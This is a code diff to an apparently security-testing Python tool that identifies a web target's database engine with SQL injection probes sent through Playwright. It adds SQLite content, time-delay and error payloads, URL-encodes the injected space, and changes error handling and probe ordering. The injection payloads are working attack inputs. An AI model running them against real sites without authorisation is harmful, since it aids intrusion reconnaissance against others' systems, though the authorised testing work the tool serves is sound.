@@ -25,6 +25,11 @@ BEHAVIORAL_PROBES = [
     {"db": "MSSQL", "type": "content", "payload": "AND 1='sqli'+'hunter'", "validator": "sqlihunter"},
     {"db": "Oracle", "type": "content", "payload": "AND 1=CONCAT('sqli','hunter')", "validator": "sqlihunter"},
     {"db": "Oracle", "type": "content", "payload": "AND 1=('sqli'||'hunter')", "validator": "sqlihunter"},
+    # SQLite Probes
+    {"db": "SQLite", "type": "content", "payload": "AND 1=SUBSTR(SQLITE_VERSION(),1,1)", "validator": "3"}, # SQLite versions are 3.x
+    {"db": "SQLite", "type": "time", "payload": "AND (SELECT COUNT(*) FROM (SELECT 1 UNION ALL SELECT 2) a, (SELECT 1 UNION ALL SELECT 2) b, (SELECT 1 UNION ALL SELECT 2) c, (SELECT 1 UNION ALL SELECT 2) d, (SELECT 1 UNION ALL SELECT 2) e, (SELECT 1 UNION ALL SELECT 2) f) > 0", "validator": 0.5}, # Cartesian product to cause delay
+    {"db": "SQLite", "type": "error", "payload": "'", "validator": "unrecognized token"},
+
     # Error-based detection (as a fallback)
     {"db": "MySQL", "type": "error", "payload": "'", "validator": "you have an error in your sql syntax"},
     {"db": "PostgreSQL", "type": "error", "payload": "'", "validator": "syntax error at or near"},
@@ -44,7 +49,8 @@ class DbFingerprinter:
     async def _test_probe(self, page: Page, base_url: str, probe: dict) -> bool:
         """Tests a single behavioral probe against the target."""
         # For now, we assume a numeric parameter 'id'. This could be made more flexible.
-        test_url = f"{base_url.rstrip('/')}/?id=1{probe['payload']}"
+        # CRITICAL FIX: Added a URL-encoded space (%20) before the payload.
+        test_url = f"{base_url.rstrip('/')}/?id=1%20{probe['payload']}"
 
         try:
             start_time = time.time()
@@ -68,7 +74,13 @@ class DbFingerprinter:
             if probe['type'] == 'error':
                 return re.search(probe['validator'], body, re.IGNORECASE) is not None
 
-        except Error:
+        except Error as e:
+            # A crashed connection is a strong signal for error-based probes.
+            if "net::ERR_ABORTED" in str(e) and probe['type'] == 'error':
+                print(f"  [+] Hit for {probe['db']} (Type: error, via connection abort)")
+                return True
+
+            print(f"  [DEBUG] Playwright error in fingerprinter for probe '{probe['payload']}': {e}")
             return False
 
         return False
@@ -86,15 +98,13 @@ class DbFingerprinter:
         self.db_scores = defaultdict(int)
 
         try:
-            # Run all probes concurrently
-            tasks = [self._test_probe(page, base_url, probe) for probe in BEHAVIORAL_PROBES]
-            results = await asyncio.gather(*tasks)
-
-            for probe, was_successful in zip(BEHAVIORAL_PROBES, results):
+            # Run probes sequentially to avoid Playwright page interference
+            for probe in BEHAVIORAL_PROBES:
+                was_successful = await self._test_probe(page, base_url, probe)
                 if was_successful:
                     self.db_scores[probe['db']] += 1
-                    print(f"  [+] Hit for {probe['db']} (Type: {probe['type']}, Payload: {probe['payload']})")
-
+                    # No need for the full payload in the hit message for cleaner logs
+                    print(f"  [+] Hit for {probe['db']} (Type: {probe['type']})")
         finally:
             await page.close()
 
